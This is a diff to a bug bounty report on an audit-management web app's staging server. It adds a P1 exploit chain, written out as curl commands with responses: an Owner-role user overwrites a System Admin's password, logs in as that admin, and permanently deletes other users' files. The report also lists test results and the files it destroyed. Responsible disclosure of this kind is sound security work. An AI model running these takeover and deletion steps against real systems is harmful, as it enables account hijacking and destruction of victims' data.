@@ -5,7 +5,7 @@
 **Asset:** `https://bugbounty1.qe.optrostaging.ai`
 **Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
 **Date:** 2026-11-11
-**Severity recommendation:** **P2 — Broken Object-Level Authorization (destructive, cross-user)**
+**Severity recommendation:** **P1 — Broken Object-Level Authorization (destructive, cross-user, chains to vertical escalation)**
 **Header on all requests:** `X-Optro-Bug-Bounty: zeno0`
 
 ---
@@ -141,6 +141,76 @@ curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
 
 ---
 
+## 5.1 Compound chain — vertical escalation + destructive delete (P1 case)
+
+BUG-015 combines with the `PUT /api/v1/users/{id}` escalation (BUG-008) to form a chain where a **lower-privilege Owner takes over a System Admin, then destroys any file in the tenant**.
+
+Verified in three steps:
+
+### Step A — Owner escalates to System Admin (BUG-008 primitive)
+
+```bash
+# Owner (role 5) writes a password onto a System Admin (role 2) account
+curl -s -X PUT "$H/api/v1/users/301" -H "token: $TA" -H "$BB" \
+  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
+  -d '{"user":{"password":"Zx9!chain47"}}'                       # → 200
+
+curl -s -X PUT "$H/api/v1/users/301" -H "token: $TA" -H "$BB" \
+  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
+  -d '{"user":{"requires_password_change":false}}'                # → 200
+
+# Log in as the System Admin
+curl -s -X POST "$H/api/v1/users/login" -H "$BB" -H "Content-Type: application/json" \
+  -d '{"credentials":{"email":"jvolles@auditboard.com","password":"Zx9!chain47"}}'
+# → 200, session.token, role_id: 2
+```
+
+### Step B — the escalated role-2 token reads an Owner's file
+
+```bash
+curl -s "$H/api/v1/files/$FID" -H "token: $TR2" -H "$BB"
+# → 200  (role 2 CAN read Owner files)
+```
+
+### Step C — the escalated role-2 token DELETES the Owner's file
+
+```bash
+curl -s -X DELETE "$H/api/v1/files/$FID" -H "token: $TR2" -H "$BB"
+# → 200 {"meta":{...},"global_audit":[{"object_id":2730,"object_type":"file",...}]}
+
+curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
+# → 410 {"detail":"Model file for request: {\"id\":2730} has already been deleted."}
+```
+
+**Observed twice, on two independent role-2 accounts:**
+
+| attacker token | victim file | DELETE | victim after |
+| --- | --- | --- | --- |
+| role 2, user **301** `jvolles@auditboard.com` | 2730 (owner 230) | **200** | **410** |
+| role 2, user **65** `daniel@u1elhxrx.mailosaur.net` | 2732 (owner 230) | **200** | **410** |
+
+### Why this raises severity
+
+- The attacker starts as a **plain Owner** — the same role the program hands to testers and to ordinary business users.
+- They end holding a **System Admin** session, which can read and destroy **any file in the tenant**.
+- Role-11 (limited Third Party User) is correctly blocked (`file:action.view` and `file:action.delete` both 422), so the floor for this chain is Owner — but Owner is the *default business role* here (116 of 145 login-enabled accounts are role 5).
+
+**Honest note on the ceiling:** the destructive delete itself requires `file:action.delete`, which Owner already holds. So BUG-015 alone is a P2 object-level authorization gap. It becomes a **P1 chain** only when combined with the BUG-008 escalation, because the chain converts a plain Owner into a System Admin who can then destroy files belonging to roles above them.
+
+### No bulk path
+
+Checked and absent — mass deletion requires a per-id loop:
+
+| path | result |
+| --- | --- |
+| `DELETE /api/v1/files` | 404 |
+| `POST /api/v1/files/bulk_delete` | 404 |
+| `POST /api/v1/files/bulk-destroy` | 404 |
+| `DELETE /api/v1/files/1,2,3` | 404 (parsed as id 1) |
+| `POST /api/v1/files/_op/bulk_delete` | 404 |
+
+---
+
 ## 6. What was tested and did NOT work (honest negatives)
 
 | vector | result |
@@ -155,6 +225,11 @@ curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
 | `DELETE` on issues / controls / risks / documents | **422** — enforced |
 | Cross-user assistant conversations | **403** "You do not have access to this conversation" — enforced |
 | `GET` another user's narrative + document body | 200 — **org-wide read is intended for the Owner role**, not claimed |
+| **role 11** `GET /files/{id}` on an Owner's file | **422 `file:action.view`** — enforced |
+| **role 11** `DELETE /files/{id}` on an Owner's file | **422 `file:action.delete`** — enforced |
+| **role 11** GET/PUT/DELETE on narrative, issue, control, risk, attachment, document_version, user | **422/403 on all 8 resources** — role-11 isolation is clean |
+| **role 2** `GET /files/{id}` on an Owner's file | **200** — role 2 can read Owner files |
+| **role 2** `DELETE /files/{id}` on an Owner's file | **200 — file destroyed** (the chain above) |
 
 **Only `DELETE /api/v1/files/{id}` is missing the check.**
 
@@ -168,7 +243,10 @@ curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
 - Destroys audit evidence and supporting documentation — an integrity and availability impact on compliance records.
 - Victim receives `410 Gone` with no ability to recover through the product.
 
-**Honest ceiling:** this is a destructive cross-user action within a single organization (single-tenant QE instance), not cross-tenant. Severity rests on unauthorized destruction of another user's data, which is a P2-class BOLA.
+**Honest ceiling:** this is a destructive cross-user action within a single organization (single-tenant QE instance), not cross-tenant.
+
+- **BUG-015 alone: P2.** Any Owner can destroy any other user's file. The attacker already holds `file:action.delete`, so it is an object-level authorization gap, not a privilege gain.
+- **BUG-015 + BUG-008: P1 chain.** A plain Owner escalates to System Admin and then destroys files belonging to roles above them. Both legs are independently reproduced on build 47.3.0-dev.
 
 ---
 
@@ -183,6 +261,6 @@ curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
 
 ## 9. Evidence / cleanup
 
-- **Test artifact**: file **2726** (`zx-...-VICTIM.docx`, created by user 230) was deleted by user 231 during this test and is unrecoverable. Disclosed here.
+- **Test artifacts**: files **2726**, **2712**, **2730**, **2732** (all created by user 230) were deleted during this test and are unrecoverable. Disclosed here.
 - Also disclosed from this engagement: issue 121 status changed `Inactive` → `Closed`; narrative 67 `ZX-B-NARRATIVE` created by user 230 and not deletable by either test account.
 - No other business objects modified. No data exfiltrated.
